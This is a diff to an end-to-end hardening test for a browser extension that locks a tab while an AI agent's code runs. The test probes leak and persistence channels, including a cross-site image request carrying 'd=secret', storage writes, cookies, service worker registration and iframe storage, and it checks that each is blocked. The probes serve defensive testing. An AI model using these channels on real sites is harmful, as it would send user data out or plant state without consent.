@@ -2636,8 +2636,10 @@ say({ type: 'result', subtype: 'success', is_error: false, result: text, session
    * user's own: they don't lock, but the lock's rules apply to them) and page code with user activation
    * (for popups): a cross-site image (TL-1), a SharedWorker from a blob: URL and a service worker sending
    * for the page (TL-2), another tab of the site posting (TL-4), popups to another site (TL-5), WebRTC and
-   * preconnect (TL-6), and what the code leaves in the site's storage (TL-3). Each item is "open" if
-   * anything got through. Everything is tried, then the open ones fail the check together.
+   * preconnect (TL-6), and the site's storage (TL-3: the agent's own saves refused, the page's own work;
+   * a cache and service worker left by a terminal run are cleared at unlock; a localStorage change gets a
+   * note in the chat). Each item is "open" if anything got through. Everything is tried, then the open
+   * ones fail the check together.
    */
   async tabLockHardeningCheck(win) {
     const dir = path.join(this.work, 'standin-harden');
@@ -2654,8 +2656,14 @@ const ctxFile = a[a.indexOf('--append-system-prompt-file') + 1];
 const ctx = a.includes('--append-system-prompt-file') ? fs.readFileSync(ctxFile, 'utf8') : a.join(' ');
 const tab = (/\\(tab (\\d+)\\)/.exec(ctx) || [])[1];
 const own = require('path').join(process.cwd(), 'bin', 'trif');
-const r = spawnSync(fs.existsSync(own) ? own : 'trif', ['run', '--tab', tab, '--timeout', '8000', '"locked"'], { encoding: 'utf8' });
-const text = JSON.stringify({ tab, ran: r.status === 0 ? r.stdout.trim() : 'trif failed: ' + String(r.stderr || r.stdout).trim() });
+const run = (code) => {
+  const r = spawnSync(fs.existsSync(own) ? own : 'trif', ['run', '--tab', tab, '--timeout', '8000', code], { encoding: 'utf8' });
+  return r.status === 0 ? r.stdout.trim() : 'trif failed: ' + String(r.stderr || r.stdout).trim();
+};
+const out = { tab, ran: run('"locked"'), saves: {} };
+// (TL-3: the agent's own saves, refused by the page's save guard)
+if (fs.existsSync(__dirname + '/saves.json')) for (const [k, code] of Object.entries(JSON.parse(fs.readFileSync(__dirname + '/saves.json', 'utf8')))) out.saves[k] = run(code);
+const text = JSON.stringify(out);
 say({ type: 'assistant', message: { model: 'claude-e2e', content: [{ type: 'text', text }] } });
 say({ type: 'result', subtype: 'success', is_error: false, result: text, session_id: 'e2e-harden' });
 `, { mode: 0o755 });
@@ -2698,7 +2706,20 @@ say({ type: 'result', subtype: 'success', is_error: false, result: text, session
       const said = JSON.parse(c.messages.find((m) => m.role === 'assistant')?.text || '{}');
       if (said.ran !== 'locked') throw new Error(`the stand-in's run: ${JSON.stringify(said)}`);
       await waitFor('the lock notice', lockNotice, { timeoutMs: 10000 });
+      return said;
     };
+    // TL-3: what the stand-in agent tries to save (each must be refused)
+    fs.writeFileSync(path.join(dir, 'saves.json'), JSON.stringify({
+      localStorage: 'localStorage.setItem("e2e-agent", "1")',
+      named: 'localStorage.e2eAgent = "1"',
+      sessionStorage: 'sessionStorage.setItem("e2e-agent", "1")',
+      cookie: 'document.cookie = "e2eagent=1"',
+      indexedDB: 'new Promise((res, rej) => { const q = indexedDB.open("e2e-agent"); q.onsuccess = () => res("opened"); q.onerror = () => rej(q.error); })',
+      caches: 'caches.open("e2e-agent").then(() => "opened")',
+      serviceWorker: 'navigator.serviceWorker.register("/e2e-sw.js?agent").then(() => "registered")',
+      later: '(async () => { await new Promise((r) => setTimeout(r, 10)); localStorage.setItem("e2e-agent-later", "1"); return "saved"; })()',
+      frame: '(() => { const f = document.createElement("iframe"); document.body.append(f); f.contentWindow.localStorage.setItem("e2e-agent-frame", "1"); return "saved"; })()',
+    }));
     // Listeners for what isn't HTTP: STUN (UDP) and preconnect (a bare TCP connection), one port each
     const dgram = require('dgram');
     const net = require('net');
@@ -2728,8 +2749,18 @@ say({ type: 'result', subtype: 'success', is_error: false, result: text, session
       const sib = await this.ext(`async (url) => (await chrome.tabs.create({ url, active: false })).id`, [`${base}/two.html?e2e=sibling`]);
       await waitFor('the other tab', async () => (await this.ext(`async (id) => (await chrome.tabs.get(id)).status`, [sib])) === 'complete' || null, { timeoutMs: 15000 });
       // ---- lock 1
-      await lockByAgent('tidy the page');
+      const said = await lockByAgent('tidy the page');
       const t0 = Date.now();
+      // TL-3: the agent's saves refused, with TRIF's words for why; the page's own saves work
+      const saved = Object.entries(said.saves || {}).filter(([, v]) => !/TRIF: your agent's code can't save data on this site/.test(v));
+      for (const [k, v] of saved) open('TL-3', `the agent's code saved (${k}): ${v}`);
+      if (!Object.keys(said.saves || {}).length) open('TL-3', 'the stand-in tried no saves');
+      const agentLeft = await run(win.tabId, '(async () => [localStorage.getItem("e2e-agent"), localStorage.getItem("e2e-agent-later"), localStorage.getItem("e2eAgent"), document.cookie.includes("e2eagent"), (await caches.keys()).includes("e2e-agent")].filter(Boolean).length)()');
+      if (agentLeft !== '0') open('TL-3', `what the agent's code tried to save is there: ${agentLeft}`);
+      const pageCtx = await this.d.findPage((u) => u.includes('e2e=harden'), { timeoutMs: 5000 });
+      const own = await this.d.eval(pageCtx, 'async () => { localStorage.setItem("e2e-own", "1"); localStorage.e2eOwnNamed = "1"; document.cookie = "e2eown=1"; return [localStorage.getItem("e2e-own"), localStorage.getItem("e2eOwnNamed"), document.cookie.includes("e2eown")].join(","); }');
+      if (own !== '1,1,true') open('TL-3', `the page's own saves: ${own}`);
+      notes.push(`agent's saves: ${JSON.stringify(said.saves)}`, `page's own saves: ${own}`);
       // TL-1: an image to another site; the CDN it already used still loads
       await run(win.tabId, `new Promise((r) => { const i = new Image(); i.onload = i.onerror = () => r(1); i.src = "${other}/e2e-img-leak?d=secret"; })`);
       await run(win.tabId, `new Promise((r) => { const i = new Image(); i.onload = i.onerror = () => r(1); i.src = "${cdn}/e2e-cdn-2.png"; })`);
@@ -2824,7 +2855,7 @@ say({ type: 'result', subtype: 'success', is_error: false, result: text, session
         `WebRTC: ${rtcMain}; from an iframe: ${rtcFrame}`, `speculation rules script: ${spec}`, `cache: ${cached}`, `lock-1 probes ${((Date.now() - t0) / 1000).toFixed(1)} s`);
       for (const p of popups) await this.ext('async (id) => { await chrome.tabs.remove(id).catch(() => {}); }', [p.id]);
       await this.ext('async (ids) => { for (const id of ids) await chrome.tabs.remove(id).catch(() => {}); }', [[typed, third]]);
-      // ---- unlock 1: the panel's Reload. The service worker and cache the code left: cleared (TL-3)
+      // ---- unlock: the panel's Reload. The service worker and cache left: cleared, no question (TL-3)
       await press('Reload');
       await waitFor('the tab unlocked', async () => (await lockNotice()) === null || null, { timeoutMs: 20000 });
       await waitFor('the page', async () => (await this.ext(`async (id) => (await chrome.tabs.get(id)).status`, [win.tabId])) === 'complete' || null, { timeoutMs: 15000 });
@@ -2836,28 +2867,10 @@ say({ type: 'result', subtype: 'success', is_error: false, result: text, session
       const sibPost2 = await run(sib, 'fetch("/e2e-sib-post2", { method: "POST", body: "x" }).then((r) => "sent " + r.status, (e) => "blocked: " + e.message)');
       extra.push(`other tab after: icon ${sibAfter}, POST ${sibPost2}`);
       if (sibAfter !== 'robot-16.png' || !/^sent/.test(sibPost2)) open('TL-4', `the other tab stayed locked after the first one unlocked: ${sibAfter}, ${sibPost2}`);
-      // ---- lock 2: the code leaves something in localStorage the site would render
-      await lockByAgent('tidy the page again');
-      await run(win.tabId, 'localStorage.setItem("e2e-poison", "<b>planted</b>"), "planted"');
-      await press('Reload');
-      // fixed: still locked, saying the site's saved data changed, with Reset and Keep; else: unlocked
-      const after2 = await waitFor('the tab unlocked, or a note on the saved data', async () => {
-        const n = await lockNotice();
-        return n === null ? { unlocked: true } : n.buttons.length > 1 ? n : null;
-      }, { timeoutMs: 20000 });
-      if (after2.unlocked) {
-        const ls = await run(win.tabId, 'localStorage.getItem("e2e-poison") || "gone"');
-        open('TL-3', `the tab unlocked with what the code left in localStorage: ${ls}`);
-      } else {
-        notes.push(`saved-data note: ${JSON.stringify(after2)}`);
-        await this.shot(this.panelCtx, 'panel-tablock-saved-data');
-        await press('Reset');
-        await waitFor('the tab unlocked after Reset', async () => (await lockNotice()) === null || null, { timeoutMs: 20000 });
-        await waitFor('the page', async () => (await this.ext(`async (id) => (await chrome.tabs.get(id)).status`, [win.tabId])) === 'complete' || null, { timeoutMs: 15000 });
-        const ls = await run(win.tabId, 'localStorage.getItem("e2e-poison") || "gone"');
-        if (ls !== 'gone') open('TL-3', `Reset left localStorage: ${ls}`);
-        extra.push(`localStorage after Reset: ${ls}`);
-      }
+      // the page's own localStorage change: unlocked as usual, with a quiet line in the chat
+      const note = await waitFor('the note in the chat', async () => (await chat())?.messages.find((m) => /saved new data while your agent's code ran/.test(m.text)) || null, { timeoutMs: 10000 }).catch(() => null);
+      if (!note) open('TL-3', 'no note in the chat about the saved data');
+      else extra.push(`chat note: "${note.text}"`);
       await sleep(500);
       await this.ext('async (id) => { await chrome.tabs.remove(id).catch(() => {}); }', [sib]);
       const summary = `${extra.join('; ')}\n${notes.join('\n')}`;
@@ -2866,15 +2879,15 @@ say({ type: 'result', subtype: 'success', is_error: false, result: text, session
       if (ids.length) throw new Error(`open: ${ids.map((k) => `${k}: ${found[k].join('; ')}`).join(' | ')}\n${summary}`);
       return `all closed. ${summary.replace(/\n/g, '; ')}`;
     } finally {
-      // nothing left locked for the checks after this one: keep any saved data asked about, else reload
+      // nothing left locked for the checks after this one
       if (await lockNotice().catch(() => null)) {
-        for (const label of ['Keep', 'Reload']) await press(label).catch(() => {});
+        await press('Reload').catch(() => {});
         await waitFor('the tab unlocked', async () => (await lockNotice()) === null || null, { timeoutMs: 15000 }).catch(() => {});
       }
       fs.writeFileSync(cfgFile, saved);
       udp.close();
       for (const s of Object.values(tcp)) s.close();
-      await run(win.tabId, '(async () => { localStorage.removeItem("e2e-poison"); for (const n of await caches.keys()) await caches.delete(n); for (const r of await navigator.serviceWorker.getRegistrations()) await r.unregister(); return 1; })()').catch(() => {});
+      await run(win.tabId, '(async () => { localStorage.removeItem("e2e-own"); localStorage.removeItem("e2eOwnNamed"); document.cookie = "e2eown=; max-age=0"; for (const n of await caches.keys()) await caches.delete(n); for (const r of await navigator.serviceWorker.getRegistrations()) await r.unregister(); return 1; })()').catch(() => {});
       await this.panel(`async () => { document.getElementById('input').value = ''; }`).catch(() => {});
       await this.ext(`async (k) => { await chrome.storage.local.remove(k); }`, [`chat:${site}`]).catch(() => {});
     }
